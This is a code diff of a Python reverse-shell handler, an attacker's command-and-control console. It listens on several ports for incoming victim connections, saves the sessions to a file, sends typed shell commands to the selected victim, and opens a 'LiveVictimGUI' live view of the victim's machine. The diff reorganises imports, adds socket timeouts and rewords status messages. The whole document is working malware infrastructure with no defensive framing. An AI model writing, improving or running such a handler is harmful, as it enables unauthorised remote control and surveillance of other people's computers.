@@ -1,21 +1,11 @@
+import threading
+import os
+import json
+import socket
+from LiveGUI import LiveVictimGUI
+import time
+import sys
 def reverse_shell():
-    import socket
-    import threading
-    import sys
-    import os
-    import json
-    import time
-    from LiveGUI import LiveVictimGUI
-    def start_live_view(client):
-        def run_gui():
-            try:
-                LiveVictimGUI(client)
-            except Exception as e:
-                print(f"error: {e}")
-            finally:
-                print("\n[!] Live view stopped")
-        live_thread = threading.Thread(target=run_gui, daemon=True)
-        live_thread.start()
     HOST = '0.0.0.0'
     SESSION_FILE = "sessions.json"
     sessions = {}     
@@ -56,14 +46,20 @@ def reverse_shell():
                     pass
             sessions[port] = client
             save_sessions()
+        client.settimeout(1.0)
         while True:
             try:
                 data = client.recv(4096)
                 if not data:
                     break
-                msg = data.decode(errors="ignore").rstrip()
-                if active_port == port:
-                    print(msg)
+                if b"LIVE_START" in data and active_port == port:
+                    pass
+                else:
+                    msg = data.decode(errors="ignore").rstrip()
+                    if active_port == port and not msg.startswith("LIVE_START"):
+                        print(msg)
+            except socket.timeout:
+                continue
             except:
                 break
         print(f"\n[-] Disconnected from port {port}")
@@ -81,12 +77,26 @@ def reverse_shell():
             save_sessions()
         print(f"[+] Listening on {port}")
         while True:
-            client, addr = server.accept()
-            threading.Thread(
-                target=handle_client,
-                args=(client, addr, port),
-                daemon=True
-            ).start()
+            try:
+                client, addr = server.accept()
+                threading.Thread(
+                    target=handle_client,
+                    args=(client, addr, port),
+                    daemon=True
+                ).start()
+            except:
+                break
+    def start_live_view(client):
+        def run_gui():
+            try:
+                LiveVictimGUI(client)
+            except Exception as e:
+                print(f"[ERROR] GUI failed: {e}")
+            finally:
+                print("\n[!] Live view stopped")
+        live_thread = threading.Thread(target=run_gui, daemon=True)
+        live_thread.start()
+        return live_thread
     def input_handler():
         nonlocal active_port
         while True:
@@ -99,33 +109,35 @@ def reverse_shell():
                     p = int(cmd.split()[1])
                     if p in sessions:
                         active_port = p
-                        print(f"[+] Using {p}")
+                        print(f"[+] Using session on port {p}")
                     else:
-                        print("[-] Not active")
+                        print(f"[-] No active session on port {p}")
                 except:
-                    print("use <port>")
+                    print("Usage: use <port>")
             elif cmd.lower() == "gui":
                 if active_port and active_port in sessions:
                     try:
                         sessions[active_port].send(b"gui\n")
-                        time.sleep(0.5)
+                        time.sleep(0.5)  
                         start_live_view(sessions[active_port])
                     except Exception as e:
                         print(f"[ERROR] Failed to start GUI: {e}")
                 else:
-                    print("[-] No active session selected")
+                    print("[-] No active session selected (use 'use <port>' first)")
             elif cmd == "clear" or cmd == "cls":
                 os.system('cls' if os.name == 'nt' else 'clear')
             elif cmd == "sessions":
-                print("\n--- STATUS ---")
+                print("\n--- ACTIVE SESSIONS ---")
+                for p in sorted(sessions.keys()):
+                    print(f"Port {p} -> CONNECTED")
+                print("\n--- LISTENING PORTS ---")
                 for p in sorted(listeners.keys()):
-                    if p in sessions:
-                        print(f"{p} -> ACTIVE")
-                    else:
-                        print(f"{p} -> LISTENING")
+                    if p not in sessions:
+                        print(f"Port {p} -> LISTENING")
                 print()
             elif cmd == "background":
                 active_port = None
+                print("[+] Backgrounded current session")
             elif cmd == "exit":
                 break
             else:
@@ -133,9 +145,9 @@ def reverse_shell():
                     try:
                         sessions[active_port].send((cmd + "\n").encode())
                     except:
-                        print("send failed")
+                        print("[-] Failed to send command")
                 else:
-                    print("no active session")
+                    print("[-] No active session selected")
     data = load_sessions()
     ports = data.get("listeners", []) + data.get("active_sessions", [])
     ports = list(set(ports))
@@ -148,7 +160,7 @@ def reverse_shell():
     for port in ports:
         threading.Thread(target=start_listener, args=(port,), daemon=True).start()
     input_handler()
-    print("\n[!] Resetting all to listening...")
+    print("\n[!] Shutting down...")
     with lock:
         sessions.clear()
         save_sessions()
